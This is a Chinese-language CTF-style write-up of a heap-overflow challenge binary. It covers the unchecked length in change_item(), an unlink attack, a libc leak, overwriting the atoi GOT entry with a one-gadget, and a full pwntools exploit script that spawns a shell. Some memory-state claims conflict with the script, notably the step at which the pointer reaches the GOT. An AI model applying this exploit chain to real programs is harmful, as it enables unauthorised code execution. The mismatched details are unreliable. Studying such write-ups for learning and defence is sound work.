**安全特性检查**（通过checksec、file、ldd推断）：

- **安全机制**：

- **运行平台**：Linux系统，需安装pwntools等利用工具

**运行要求**：
- 需要对应架构的Linux环境

- 程序路径为`./data/sample8`

## 漏洞成因

### 关键结构体分析
程序使用两个全局数组管理物品：
- `unk_6020C8`（地址0x6020c8）：存储物品名称指针的数组，每个元素8字节
- `itemlist`（地址0x6020c0）：存储物品名称长度的数组，每个元素4字节

每个物品占用两个数组中的相同索引位置，结构如下：
```c
struct item {
    char *name_ptr;    // 在unk_6020C8数组中
    size_t name_len;   // 在itemlist数组中  
};
```

### 漏洞位置及原因
**漏洞函数**：`change_item()`

**漏洞代码**：
```c
printf("Please enter the length of item name:");
read(0, nptr, 8u);
v2 = atoi(nptr);  // 用户控制的新长度
printf("Please enter the new name of the item:");
*(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * v1) + (int)read(0, *((void **)&unk_6020C8 + 2 * v1), v2)) = 0;
```

**漏洞成因**：
1. **缺少长度验证**：程序允许用户重新指定物品名称长度（v2），但未验证新长度是否超过原始malloc分配的大小
2. **直接使用用户输入**：使用用户控制的长度v2直接读取数据到原始堆缓冲区
3. **堆缓冲区溢出**：当v2大于原始分配大小时，写入数据会溢出到相邻堆块，破坏堆元数据和用户数据

**漏洞类型**：堆缓冲区溢出（Heap Buffer Overflow）

**利用可行性**：通过精心构造的溢出数据，可以：
- 覆盖相邻堆块的chunk头（size和prev_size字段）
- 破坏堆管理结构（bins、top chunk等）
- 实现任意地址读写（通过unlink攻击）
- 最终获得代码执行权限（通过GOT覆盖）

## 漏洞利用过程

### 利用步骤总览
整个利用过程通过堆溢出触发unlink攻击，修改全局指针，泄露libc地址，覆盖GOT表，最终获得shell。以下是详细步骤：

| 步骤 | 操作 | 内存关键变化 | 攻击效果 |
|------|------|--------------|----------|
| 1 | 分配两个0x80堆块 | 堆块1(0x310fd020)存"aaaa"，堆块2(0x310fd0b0)存"bbbb"<br>全局数组索引0→堆块1，索引1→堆块2 | 建立攻击基础 |
| 2 | 溢出构造fake chunk | 堆块1数据区构造fake chunk：<br>prev_size=0, size=0x81, fd=0x6020b0, bk=0x6020b8<br>覆盖堆块2：prev_size=0x80, size=0x90(清除PREV_INUSE) | 准备unlink攻击 |
| 3 | 释放堆块2 | 触发unlink操作<br>全局数组索引1指针从0x310fd0c0改为0x602068(atoi GOT) | unlink成功，获得任意地址读写 |
| 4 | 准备GOT覆盖 | 通过全局指针写入数据<br>为后续GOT覆盖做准备 | 建立GOT写能力 |
| 5 | 泄露libc地址 | 调用puts输出atoi实际地址<br>解析得到atoi_addr | 获取libc基址 |
| 6 | 计算one-gadget | onegadget = atoi_addr - libc.symbols["atoi"] + 0xf03a4 | 计算shellcode地址 |
| 7 | 覆盖GOT表 | atoi GOT条目(0x602068)被覆盖为one-gadget地址 | 代码执行准备完成 |
| 8 | 触发exit | 调用exit→atoi(已被覆盖)→执行one-gadget | 获得shell权限 |
| 9 | 交互控制 | 通过p.interactive()获得shell | 利用成功 |

### 详细内存布局变化

**初始状态**：
```
堆布局：
0x310fd000: [初始堆块] size=0x21, 存储hello_message和goodbye_message函数指针
0x310fd140: [Top chunk] size=0x20f41

全局数组：
0x6020c0: [itemlist] 所有条目为空
```

**步骤1后**：
```
堆布局：
0x310fd000: [初始堆块] 完好
0x310fd020: [堆块1] size=0x91, 数据="aaaa"
0x310fd0b0: [堆块2] size=0x91, 数据="bbbb"  
0x310fd140: [Top chunk] size=0x20ec1

全局数组：
0x6020c0: [0]长度=0x80, 指针=0x310fd030
0x6020c8: [1]长度=0x80, 指针=0x310fd0c0
```

**步骤2后**：
```
堆块1数据区(0x310fd030):
+0000: 0x0000000000000000 0x0000000000000081  [fake chunk头]
+0010: 0x00000000006020b0 0x00000000006020b8  [fd/bk指针]
+0020-+0070: 0x6161616161616161...           [填充数据]
+0080: 0x0000000000000080 0x0000000000000090  [覆盖堆块2元数据]

堆块2头部被修改：
prev_size从0→0x80, size从0x91→0x90(PREV_INUSE清除)
```

**步骤3后**：
```
关键变化：
- 全局数组索引1指针: 0x310fd0c0 → 0x602068(atoi GOT)
- 堆块2被释放并合并
- stdin结构(0x6020b0)被部分破坏
```

**步骤7后**：
```
GOT表被覆盖：
0x602068(atoi GOT): 原始值 → one-gadget地址(0x78626d4713a4)
```

**最终状态**：
程序控制流转移到one-gadget，获得shell权限，原始程序内存布局不可访问。

## Exploit

```python
from pwn import *

# 设置调试环境
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# 加载二进制文件和libc
elf = ELF('./data/sample8')
p = process('./data/sample8')
libc = elf.libc

# 工具函数定义
sl = lambda s : p.sendline(s.encode() if isinstance(s, str) else s)
sd = lambda s : p.send(s.encode() if isinstance(s, str) else s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s.encode() if isinstance(s, str) else s)
ti = lambda : p.interactive()

def malloc(size, content):
    """分配堆块函数"""
    ru("Your choice:")
    sl('2')  # 选择添加物品
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the name of item:")
    sd(content)

def free(index):
    """释放堆块函数""" 
    ru("Your choice:")
    sl('4')  # 选择删除物品
    ru("Please enter the index of item:")
    sl(str(index))

def exit():
    """退出函数"""
    ru("Your choice:")
    sl('5')  # 选择退出

def puts():
    """显示物品函数"""
    ru("Your choice:")
    sl('1')  # 选择显示物品

def change(index, size, content):
    """修改物品函数 - 漏洞所在"""
    ru("Your choice:")
    sl('3')  # 选择修改物品
    ru("Please enter the index of item:")
    sd(str(index))
    ru("Please enter the length of item name:")
    sd(str(size))  # 漏洞：用户可控的长度，无验证
    ru("Please enter the new name of the item:")
    sd(content)   # 堆缓冲区溢出发生在这里

# ==================== 漏洞利用开始 ====================

# Step 1: 分配两个堆块建立攻击基础
malloc(0x80, b'aaaa')  # 索引0 - 用于溢出的堆块
malloc(0x80, b'bbbb')  # 索引1 - 目标堆块

# Step 2: 通过堆溢出构造fake chunk
# 计算fake chunk的fd/bk指针，指向全局数组附近用于unlink攻击
FD = 0x6020c8 - 3*8  # 指向stdin结构附近
BK = FD + 8          # 指向completed附近

# 构造payload: fake chunk头 + 填充 + 覆盖目标堆块元数据
py1 = p64(0) + p64(0x81) + p64(FD) + p64(BK) + b"a"*0x60 + p64(0x80) + p64(0x90)
change(0, 0x90, py1)  # 关键：使用大于原始大小的长度触发溢出

# Step 3: 释放堆块触发unlink攻击
free(1)  # 释放索引1，触发unlink修改全局指针

# Step 4: 准备GOT覆盖
atoi_got = elf.got["atoi"]  # 获取atoi的GOT条目地址
py2 = b'a'*24 + p64(atoi_got)
change(0, len(py2), py2)  # 通过全局指针写入GOT地址

# Step 5: 泄露libc地址
puts()  # 调用puts输出atoi的实际地址
# 解析泄露的地址（调试中显示在输出中）
atoi_addr = u64(ru(b'\n--')[4:10].ljust(8, b'\x00'))

# Step 6: 计算one-gadget地址
# 基于泄露的atoi地址计算libc基址和one-gadget偏移
onegadget = atoi_addr - libc.symbols["atoi"] + 0xf03a4

# Step 7: 覆盖GOT表实现代码执行
change(0, 0x10, p64(onegadget))  # 将atoi GOT覆盖为one-gadget

# Step 8: 触发代码执行
exit()  # 调用exit→atoi(已被覆盖)→执行one-gadget

# Step 9: 获得shell控制
p.interactive()  # 进入交互模式，获得shell
```

### 关键攻击技术说明
1. **堆溢出构造**：通过change_item的长度验证缺失，实现精确的堆元数据覆盖
2. **unlink攻击**：利用fake chunk的fd/bk指针，在free时触发unlink修改全局指针
3. **GOT劫持**：通过控制的全局指针实现任意G表读写，最终覆盖为one-gadget
4. **地址泄露**：利用puts函数输出GOT条目值，绕过ASLR获取libc基址

此exp成功演示了从堆溢出到完整代码执行的完整攻击链，适用于类似的内存破坏漏洞利用场景。
